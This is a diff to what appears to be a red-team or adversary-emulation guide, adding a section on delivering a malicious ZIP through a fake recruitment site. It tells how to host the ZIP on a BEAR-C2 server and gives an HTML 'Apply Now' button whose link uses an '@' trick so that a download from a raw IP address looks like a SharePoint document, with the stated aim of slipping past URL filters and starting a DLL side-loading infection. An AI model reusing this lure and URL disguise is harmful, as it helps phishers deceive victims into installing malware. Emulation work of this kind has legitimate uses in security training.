@@ -59,7 +59,24 @@ To deploy it:
   3. Click Start Server and copy the generated Phishing URL.
 
 
+### Hosting and Delivering the Payload (BEAR-C2 Integration)
 
+To complete the attack chain, the malicious ZIP file must be hosted on the BEAR-C2 server and linked directly to the "Apply Now" button on the fake recruitment website. This ensures a seamless transition from the phishing lure to the malware download.
+
+<img width="1366" height="665" alt="Screenshot From 2026-10-22 04-24-38" src="https://github.com/user-attachments/assets/ae0332cb-28d9-4e07-8242-7a29c41c95ac" />
+
+
+**Host the Malicious File**
+Open the **Host File** module in BEAR-C2. 
+* Select `SignedConnection.zip` using the **Choose File** button.
+* Set the **URL Mask** to a trusted domain (e.g., `my.sharepoint.com/personal/file...`) to make the download link appear as a legitimate Microsoft SharePoint document.
+
+```html
+<button class="apply" style="cursor: pointer;" onclick="window.location.href = 'https://my.sharepoint.com/personal/file...@10.242.32.124:8080'">Apply Now</button>
+```
+
+**Result:**
+When the victim visits the phishing page and clicks **"Apply Now"**, the browser is redirected to the BEAR-C2 server using the masked SharePoint URL. This immediately forces the download of `SignedConnection.zip`, initiating the DLL Side-Loading and SnailResin infection chain without raising immediate suspicion from URL filtering gateways.
 
 ## The third stage (Malicious ZIP and DLL Side-Loading)
 
